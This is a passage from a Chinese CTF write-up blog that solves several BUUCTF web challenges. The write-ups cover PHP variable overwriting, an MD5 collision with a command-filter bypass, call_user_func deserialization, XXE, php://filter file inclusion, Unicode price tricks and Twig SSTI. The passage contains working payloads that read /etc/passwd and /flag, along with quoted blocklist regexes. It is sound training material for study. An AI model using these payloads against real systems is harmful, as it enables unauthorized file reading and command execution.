cat</h2><p>整吐了知道是git泄露但是用githack扫完之后就是没有源码。。。</p><p>接一下百度的wp的源码</p><p>index.php</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &#39;flag.php&#39;;$yds &#x3D; &quot;dog&quot;;$is &#x3D; &quot;cat&quot;;$handsome &#x3D; &#39;yds&#39;;foreach($_POST as $x &#x3D;&gt; $y)&#123;    $$x &#x3D; $y;&#125;foreach($_GET as $x &#x3D;&gt; $y)&#123;    $$x &#x3D; $$y;&#125;foreach($_GET as $x &#x3D;&gt; $y)&#123;    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;        exit($handsome);    &#125;&#125;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;    exit($yds);&#125;if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;    exit($is);&#125;echo &quot;the flag is: &quot;.$flag;</code></pre><p>flag.php</p><pre class="language-none"><code class="language-none">&lt;?php $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</code></pre><p>前两个<code>foreach</code>语句分别将<code>POST</code>参数和<code>GET</code>参数进行变量覆盖，接着是三个if语句，<code>exit()</code>函数退出脚本的同时输出变量，最后一句是输出我们想要的flag。</p><p>首先我们想到的是让脚本执行到最后一句<code>echo $flag;</code>，但即使绕过三个if语句，我们<code>GET</code>传参或者<code>POST</code>传参的flag总会被变量覆盖：如我们<code>GET</code>传参flag=aaa，在第二个foreach语句中变成<code>$flag</code> = <code>$aaa</code>，而<code>$aaa</code>变量没有定义为空，最后的输出就是空</p><p>但是由于变量覆盖的原因最终不会显示flag</p><p>而<code>exit()</code>函数虽然会退出执行，但也会输出其参数，我们可以利用变量覆盖将<code>exit()</code>函数内的参数用<code>$flag</code>覆盖掉就能输出flag了；</p><p>所以我们可以借助后两个if语句中的exit来输出flag</p><p>当我们get yds=flag时，满足第二个if判断，而由于第一个foreach语句，$yds=$flag，所以最终就会变成exit($flag);</p><p>还可以借助第三个if语句，当我们get flag=flag&amp;is=flag后经过第二个foreach语句$flag=$flag，$is=$flag对flag自身无影响，又因为满足第三个if语句，也会输出flag值</p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/113790063?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">BJDCTF2020]Mark loves cat (两种解法)（变量覆盖漏洞）_Zero_Adam的博客-CSDN博客</a></p><p> <a href="https://blog.csdn.net/jianpanliu/article/details/107028582">BJDCTF2020]Mark loves cat_qtL0ng的博客-CSDN博客</a></p><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>进入后看到img参数像base64，解码两次再用16进制转字符串会变成555.png</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181026268.png" alt="image-20210811181026268"></p><p>所以为了想读取源码，我们将index.php按照相同的方式加密后变为</p><p>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p><p>修改后替换img原来的值，发现依旧返回了一大串base64编码，解码后可获得源码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181304356.png" alt="image-20210811181304356"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181317988.png" alt="image-20210811181317988"></p><p>重点：</p><pre class="language-none"><code class="language-none">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;        echo &#96;$cmd&#96;;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;</code></pre><p>先看第二个if里的md5的比较，传数组或者传md5值为0e开头的都没法绕过去</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/114494427">(1条消息) 浅谈PHP中哈希比较缺陷问题及哈希强比较相关问题_末初 · mochu7-CSDN博客</a></p><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">MD5碰撞的一些例子 - 简书 (jianshu.com)</a></p><p>从这两篇文章里能找到存在文件十六进制字节流数据的哈希值相等</p><p>再考虑到要将一些不可见字符传到服务器，这里可以使用url编码</p><p>最终</p><pre class="language-none"><code class="language-none">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>这里要绕过两个if语句，然后执行cmd中的参数，所以可以利用反斜杠绕过，在正则表达式中三个反斜杠才能匹配到反斜杠，</p><p><a href="https://blog.csdn.net/weixin_41463193/article/details/83539168">(1条消息) 【PHP】之4个反斜杠、3个反斜杠的情况_Hertter的博客-CSDN博客</a></p><p><a href="https://www.thinbug.com/q/28062568">为什么3反斜杠在php中等于4反斜杠？ - Thinbug</a></p><p>题目里的正则其实有些问题，所以虽然存在了四个反斜杠但是依旧没有过滤掉反斜杠</p><p>贴个大佬的文章</p><p><a href="https://www.jianshu.com/p/076c5b422c96">从一道CTF的非预期解看PHP反斜杠匹配问题 - 简书 (jianshu.com)</a></p><p>可以先用dir查看目录</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811185153589.png" alt="image-20210811185153589"></p><p>ca\t%20/flag来绕过第一个if</p><p>用\的原因是因为在linux下行尾输\可以换行并且继续输入命令</p><p>这里正则匹配漏了uniq和sort，用这俩也能拿到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811190241730.png" alt="image-20210811190241730"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811190251827.png" alt="image-20210811190251827"></p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>先抓包</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811225117333.png" alt="image-20210811225117333"></p><p>发现有两个post的参数</p><p>然后根据报错的信息</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811225205171.png" alt="image-20210811225205171"></p><p>这里用了call_user_func函数，也就是func是函数名，p是参数</p><p>用system试时发现被过滤了，发现file_get_contents函数可以用</p><p>file_get_contents拿源码</p><pre><code>&lt;?php$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) &#123;    $result = call_user_func($func, $p);    $a= gettype($result);    if ($a == &quot;string&quot;) &#123;        return $result;    &#125; else &#123;return &quot;&quot;;&#125;&#125;class Test &#123;    var $p = &quot;Y-m-d h:i:s a&quot;;    var $func = &quot;date&quot;;    function __destruct() &#123;        if ($this-&gt;func != &quot;&quot;) &#123;            echo gettime($this-&gt;func, $this-&gt;p);        &#125;    &#125;&#125;$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) &#123;    $func = strtolower($func);    if (!in_array($func,$disable_fun)) &#123;        echo gettime($func, $p);    &#125;else &#123;        die(&quot;Hacker...&quot;);    &#125;&#125;?&gt;</code></pre><p>由于这个过滤不存在与test中，所以可以利用反序列化来执行命令</p><p>利用find命令来查找文件名中有flag的文件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224457971.png" alt="image-20210811224457971"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224439715.png" alt="image-20210811224439715"></p><p>最后用file_get_contents来查看文件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224611612.png" alt="image-20210811224611612"></p><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>看到这题目第一眼就感觉是xxe漏洞，正好趁这个机会把xml学一下</p><p><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞 - 先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/qq_52907838/article/details/118030007">NCTF2019]Fake XML cookbook_sgnbi~的博客-CSDN博客</a></p><p><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户</a></p><blockquote><p>- XML被设计为传输和存储数据，其焦点是数据的内容。</p><p>- HTML被设计用来显示数据，其焦点是数据的外观。</p></blockquote><p>基本语法：</p><blockquote><p>- 所有 XML 元素都须有关闭标签。</p><p>- XML 标签对大小写敏感。</p><p>- XML 必须正确地嵌套。</p><p>- XML 文档必须有根元素。</p><p>- XML 的属性值须加引号。</p></blockquote><p>- 实体引用，如果你把字符 &quot;&lt;&quot; 放在 XML元素中，会发生错误，这是因为解析器会把它当作新元素的开始。这样会产生XML错误：</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812002508519.png" alt="image-20210812002508519"></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--根元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span> <span class="token attr-name">category</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>COOKING<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstore的子元素，category为属性--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Everyday Italian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>      <span class="token comment">&lt;!--book的子元素，lang为属性--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span>Giada De Laurentiis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>       <span class="token comment">&lt;!--book的子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>year</span><span class="token punctuation">></span></span>2005<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>year</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>30.00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的结束--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstore的结束--></span></code></pre><p><strong>DTD</strong></p><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;&#x2F;to&gt;&lt;from&gt;@re&lt;&#x2F;from&gt;&lt;head&gt;v3ry&lt;&#x2F;head&gt;&lt;body&gt;g00d!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;</code></pre><p>当使用外部DTD时，通过如下语法引入。</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root-element</span> <span class="token name">SYSTEM</span> <span class="token string">"filename"</span><span class="token punctuation">></span></span></code></pre><p>外部DTD实例</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root-element</span> <span class="token name">SYSTEM</span> <span class="token string">"test.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Y0u<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>@re<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>v3ry<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>g00d!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre><p>test.dtd：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--定义to元素为”#PCDATA”类型--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--定义from元素为”#PCDATA”类型--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">head</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--定义head元素为”#PCDATA”类型--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--定义body元素为”#PCDATA”类型--></span></code></pre><p>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</p><p><strong>内部实体示例代码</strong></p><pre class="language-none"><code class="language-none">&lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY writer &quot;Dawn&quot;&gt;    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;©right;&lt;&#x2F;test&gt;</code></pre><p><strong>外部实体示例代码</strong></p><pre class="language-none"><code class="language-none">&lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;    &lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;©right;&lt;&#x2F;author&gt;</code></pre><p><strong>XXE漏洞简介</strong></p><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。<br>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812004625128.png" alt="image-20210812004625128"></p><p>通过各种协议可以实现xxe注入，例如利用file://来访问本地文件系统</p><p>解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。<br><a href="https://www.runoob.com/php/func-simplexml-load-string.html">simplexml_load_string()</a>可以读取XML</p><p>简单的payload</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&lt;&#x2F;xml&gt;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;  ]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre><p><strong>题解：</strong></p><p>抓包，能看出是用xml进行传输数据</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812003649956.png" alt="image-20210812003649956"></p><p>直接上payload</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;  ]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812004223242.png" alt="image-20210812004223242"></p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>看这个url，试试伪协议读取</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163436662.png" alt="image-20210812163436662"></p><p>多了个php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163515084.png" alt="image-20210812163515084"></p><p>所以可以用这个来读源码?category=php://filter/read=convert.base64-encode/resource=index</p><p>base64解码后的重点</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$file &#x3D; $_GET[&#39;category&#39;];if(isset($file))&#123;if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;include ($file . &#39;.php&#39;);&#125;else&#123;echo &quot;Sorry, we currently only support woofers and meowers.&quot;;&#125;&#125;?&gt;</code></pre><p>存在flag.php页面，之后就是想办法把他读出来</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163740442.png" alt="image-20210812163740442"></p><p>接下来有一个</p><p>php伪协议嵌套的知识点</p><p>PHP伪协议可以将某个文件或文件夹包含在php://filter/convert.base64-encode/resource=flag中。比如：php://filter/convert.base64-encode/<strong>index</strong>/resource=flag</p><p>这样就能绕过if的判断，读取flag文件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812164621882.png" alt="image-20210812164621882"></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165152600.png" alt="image-20210812165152600"></p><p>输入id和价格，应该是购买独角兽，而且price只允许输入一位数，前三个买的时候都显示</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165251531.png" alt="image-20210812165251531"></p><p>但是因为price的输入限制，所以我猜这里应该是要想办法购买第四个独角兽</p><p>这里要利用Unicode的编码，查找一个大于1337的字符</p><p><a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p><p>比如这个</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165952292.png" alt="image-20210812165952292"></p><p>成功拿到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812170021095.png" alt="image-20210812170021095"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812170027487.png" alt="image-20210812170027487"></p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220813990.png" alt="image-20210812220813990"></p><p>看一眼hint</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220919778.png" alt="image-20210812220919778"></p><p>flag页面的登录框</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221024199.png" alt="image-20210812221024199"></p><p>这里存在ssti注入</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220731194.png" alt="image-20210812220731194"></p><p>可以试出来是twig模板，根据提示注入点应该在cookie里，抓包</p><p>通过修改user内容实现注入</p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n&#39;s Blog</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221739824.png" alt="image-20210812221739824"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221614830.png" alt="image-20210812221614830"></p><p>ssti还是不太懂，毕竟我python还是没学会，遇到ssti的题我只能直接找payload，先放在这，等刷完buu第二页题目之后再回头看一遍</p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>题目源码</p><pre class="language-python" data-language="python"><code class="language-python">#! &#x2F;usr&#x2F;bin&#x2F;env python# #encoding&#x3D;utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#39;latin1&#39;)app &#x3D; Flask(__name__)secert_key &#x3D; os.urandom(16)class Task:    def __init__(self, action, param, sign, ip):        self.action &#x3D; action        self.param &#x3D; param        self.sign &#x3D; sign        self.sandbox &#x3D; md5(ip)        if(not os.path.exists(self.sandbox)):            os.mkdir(self.sandbox)    def Exec(self):        result &#x3D; &#123;&#125;        result[&#39;code&#39;] &#x3D; 500        if (self.checkSign()):            if &quot;scan&quot; in self.action:                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)                resp &#x3D; scan(self.param)                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):                    result[&#39;data&#39;] &#x3D; resp                else:                    print resp                    tmpfile.write(resp)                    tmpfile.close()                result[&#39;code&#39;] &#x3D; 200            if &quot;read&quot; in self.action:                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)                result[&#39;code&#39;] &#x3D; 200                result[&#39;data&#39;] &#x3D; f.read()            if result[&#39;code&#39;] &#x3D;&#x3D; 500:                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;        else:            result[&#39;code&#39;] &#x3D; 500            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;        return result         def checkSign(self):        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):            return True        else:            return False@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def geneSign():    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action &#x3D; &quot;scan&quot;    return getSign(action, param)@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def challenge():    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip &#x3D; request.remote_addr    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task &#x3D; Task(action, param, sign, ip)    return json.dumps(task.Exec())@app.route(&#39;&#x2F;&#39;)def index():    return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return 